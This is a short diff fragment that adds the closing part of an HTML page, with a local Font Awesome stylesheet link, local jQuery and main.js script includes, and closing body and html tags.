+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+    
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+
+
+</body>
+</html>
